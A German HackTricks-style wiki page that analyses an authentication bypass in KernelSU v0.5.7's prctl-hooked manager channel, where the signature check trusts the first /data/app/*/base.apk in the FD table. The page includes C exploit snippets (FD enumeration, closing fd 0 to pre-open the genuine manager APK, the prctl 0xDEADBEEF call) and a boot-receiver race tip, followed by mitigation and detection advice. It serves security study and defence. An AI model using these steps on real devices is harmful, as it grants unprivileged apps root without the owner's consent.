# Auth-Bypass und Missbrauch von Syscall-Hooks bei Android-Rooting-Frameworks (KernelSU/Magisk) Manager

{{#include ../../banners/hacktricks-training.md}}

Rooting-Frameworks wie KernelSU, APatch, SKRoot und Magisk patchen häufig den Linux-/Android-Kernel und stellen einer unprivilegierten Userspace-„Manager“-App über einen gehookten Syscall privilegierte Funktionen bereit. Wenn der Manager-Authentifizierungsschritt fehlerhaft ist, kann jede lokale App diesen Kanal erreichen und auf bereits gerooteten Geräten ihre Privilegien erhöhen.

Diese Seite abstrahiert die in öffentlich zugänglicher Forschung aufgedeckten Techniken und Fallstricke (insbesondere Zimperiums Analyse von KernelSU v0.5.7), damit sowohl Red- als auch Blue-Teams Angriffsflächen, Exploitation-Primitives und robuste Mitigationsmaßnahmen verstehen können.

---
## Architektur-Muster: Syscall-gehookter Manager-Kanal

- Ein Kernel-Modul/-Patch hookt einen Syscall (häufig prctl), um „Befehle“ aus dem Userspace zu empfangen.
- Das Protokoll besteht typischerweise aus: magic_value, command_id, arg_ptr/len ...
- Eine Userspace-Manager-App authentifiziert sich zunächst (z. B. CMD_BECOME_MANAGER). Sobald der Kernel den Aufrufer als vertrauenswürdigen Manager markiert hat, werden privilegierte Befehle akzeptiert:
- Root an den Aufrufer vergeben (z. B. CMD_GRANT_ROOT)
- Allowlists/Denylists für su verwalten
- SELinux-Richtlinie anpassen (z. B. CMD_SET_SEPOLICY)
- Version/Konfiguration abfragen
- Da jede App Syscalls aufrufen kann, ist die Korrektheit der Manager-Authentifizierung entscheidend.

Beispiel (KernelSU-Design):
- Gehookter Syscall: prctl
- Magic Value zum Umleiten an den KernelSU-Handler: 0xDEADBEEF
- Zu den Befehlen gehören: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT usw.

---
## KernelSU-v0.5.7-Authentifizierungsablauf (wie implementiert)

Wenn der Userspace prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) aufruft, führt KernelSU folgende Prüfungen durch:

1) Prüfung des Pfadpräfixes
- Der angegebene Pfad muss mit einem erwarteten Präfix für die UID des Aufrufers beginnen, z. B. /data/data/<pkg> oder /data/user/<id>/<pkg>.
- Referenz: core_hook.c (v0.5.7), Pfadpräfix-Logik.

2) Eigentümerprüfung
- Der Pfad muss der UID des Aufrufers gehören.
- Referenz: core_hook.c (v0.5.7), Eigentümer-Logik.

3) APK-Signaturprüfung über einen Scan der FD-Tabelle
- Die geöffneten File Descriptors (FDs) des aufrufenden Prozesses werden durchlaufen.
- Es wird die erste Datei ausgewählt, deren Pfad zu /data/app/*/base.apk passt.
- Die APK-v2-Signatur wird geparst und gegen das offizielle Manager-Zertifikat geprüft.
- Referenzen: manager.c (Iteration über FDs), apk_sign.c (APK-v2-Verifikation).

Wenn alle Prüfungen erfolgreich sind, cached der Kernel die UID des Managers vorübergehend und akzeptiert privilegierte Befehle von dieser UID, bis sie zurückgesetzt wird.

---
## Schwachstellenklasse: Vertrauen in die „erste passende APK“ bei der FD-Iteration

Wenn die Signaturprüfung an die „erste passende /data/app/*/base.apk“ gebunden ist, die in der FD-Tabelle des Prozesses gefunden wird, wird nicht tatsächlich das eigene Package des Aufrufers geprüft. Ein Angreifer kann eine korrekt signierte APK (die des echten Managers) so vorab platzieren, dass sie in der FD-Liste vor der eigenen base.apk erscheint.

Dieses Trust-by-Indirection ermöglicht es einer unprivilegierten App, sich als Manager auszugeben, ohne den Signaturschlüssel des Managers zu besitzen.

Ausgenutzte Schlüsseleigenschaften:
- Der FD-Scan bindet nicht an die Package-Identität des Aufrufers; er vergleicht lediglich Pfad-Strings anhand eines Musters.
- open() gibt den niedrigsten verfügbaren FD zurück. Durch das vorherige Schließen niedriger nummerierter FDs kann ein Angreifer die Reihenfolge kontrollieren.
- Der Filter prüft nur, ob der Pfad zu /data/app/*/base.apk passt – nicht, ob er dem installierten Package des Aufrufers entspricht.

---
## Voraussetzungen für den Angriff

- Das Gerät ist bereits mit einem verwundbaren Rooting-Framework gerootet (z. B. KernelSU v0.5.7).
- Der Angreifer kann lokal beliebigen unprivilegierten Code ausführen (Android-App-Prozess).
- Der echte Manager hat sich noch nicht authentifiziert (z. B. direkt nach einem Reboot). Einige Frameworks cachen die Manager-UID nach erfolgreicher Authentifizierung; der Angreifer muss den Wettlauf gewinnen.

---
## Exploitation-Übersicht (KernelSU v0.5.7)

Schritte auf hoher Ebene:
1) Einen gültigen Pfad zum eigenen App-Datenverzeichnis erstellen, um die Präfix- und Eigentümerprüfungen zu erfüllen.
2) Sicherstellen, dass eine echte KernelSU-Manager-base.apk auf einem niedriger nummerierten FD als die eigene base.apk geöffnet wird.
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) aufrufen, um die Prüfungen zu bestehen.
4) Privilegierte Befehle wie CMD_GRANT_ROOT, CMD_ALLOW_SU und CMD_SET_SEPOLICY ausführen, um die Rechteausweitung dauerhaft zu machen.

Praktische Hinweise zu Schritt 2 (FD-Reihenfolge):
- Den FD der eigenen /data/app/*/base.apk ermitteln, indem die Symlinks in /proc/self/fd durchlaufen werden.
- Einen niedrigen FD (z. B. stdin, fd 0) schließen und zuerst die legitime Manager-APK öffnen, damit sie fd 0 belegt (oder einen anderen Index unterhalb des FDs der eigenen base.apk).
- Die legitime Manager-APK in die eigene App integrieren, damit ihr Pfad dem naiven Filter des Kernels entspricht. Sie kann beispielsweise unter einem Subpfad abgelegt werden, der zu /data/app/*/base.apk passt.

Beispiel-Code-Snippets (Android/Linux, nur zur Veranschaulichung):

Offene FDs aufzählen, um base.apk-Einträge zu finden:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Lasse einen FD mit niedrigerer Nummer auf die legitime Manager-APK zeigen:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Manager-Authentifizierung über prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Nach erfolgreichem Abschluss können privilegierte Befehle ausgeführt werden (Beispiele):
- CMD_GRANT_ROOT: den aktuellen Prozess zu root hochstufen
- CMD_ALLOW_SU: dein Package/deine UID zur allowlist für persistentes su hinzufügen
- CMD_SET_SEPOLICY: die SELinux-Policy anpassen, sofern vom Framework unterstützt

Hinweis zu Race/Persistence:
- Einen BOOT_COMPLETED-Receiver im AndroidManifest (RECEIVE_BOOT_COMPLETED) registrieren, um nach einem Reboot frühzeitig zu starten und die Authentication vor dem eigentlichen Manager zu versuchen.

---
## Hinweise zur Detection und Mitigation

Für Framework-Entwickler:
- Die Authentication an das Package/die UID des Callers binden, nicht an beliebige FDs:
- Das Package des Callers anhand seiner UID auflösen und es über PackageManager gegen die Signatur des installierten Packages verifizieren, anstatt FDs zu durchsuchen.
- Wenn nur der Kernel verwendet wird, eine stabile Caller-Identität (Task-Credentials) nutzen und gegen eine stabile Source of Truth validieren, die von init/einem Userspace-Helper verwaltet wird, nicht gegen Prozess-FDs.
- Path-Prefix-Checks nicht als Identität verwenden; sie können vom Caller trivial erfüllt werden.
- Eine nonce-basierte Challenge–Response über den Channel verwenden und jede gecachte Manager-Identität beim Boot oder bei wichtigen Events löschen.
- Wenn möglich, eine authentifizierte Binder-basierte IPC in Betracht ziehen, anstatt generische Syscalls zweckzuentfremden.

Für Defender/Blue Team:
- Das Vorhandensein von Rooting-Frameworks und Manager-Prozessen erkennen; auf prctl-Aufrufe mit verdächtigen Magic Constants (z. B. 0xDEADBEEF) überwachen, sofern Kernel-Telemetrie verfügbar ist.
- In verwalteten Flotten Boot-Receiver aus nicht vertrauenswürdigen Packages blockieren oder Alerts auslösen, wenn diese nach dem Boot schnell privilegierte Manager-Befehle versuchen.
- Sicherstellen, dass die Geräte auf gepatchte Framework-Versionen aktualisiert wurden; gecachte Manager-IDs nach einem Update invalidieren.

Einschränkungen des Angriffs:
- Betrifft nur Geräte, die bereits mit einem verwundbaren Framework gerootet wurden.
- Erfordert typischerweise einen Reboot-/Race-Zeitraum, bevor sich der legitime Manager authentifiziert (einige Frameworks cachen die Manager-UID bis zum Reset).

---
## Verwandte Hinweise zu verschiedenen Frameworks

- Passwortbasierte Authentication (z. B. historische APatch-/SKRoot-Builds) kann schwach sein, wenn Passwörter erratbar oder per Brute-Force angreifbar sind oder die Validierungen fehlerhaft funktionieren.
- Package-/Signatur-basierte Authentication (z. B. KernelSU) ist prinzipiell stärker, muss jedoch an den tatsächlichen Caller gebunden werden und nicht an indirekte Artefakte wie FD-Scans.
- Magisk: CVE-2024-48336 (MagiskEoP) hat gezeigt, dass selbst ausgereifte Ökosysteme für Identity-Spoofing anfällig sein können, was zu Code Execution mit root innerhalb des Manager-Kontexts führt.

---
## Referenzen

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
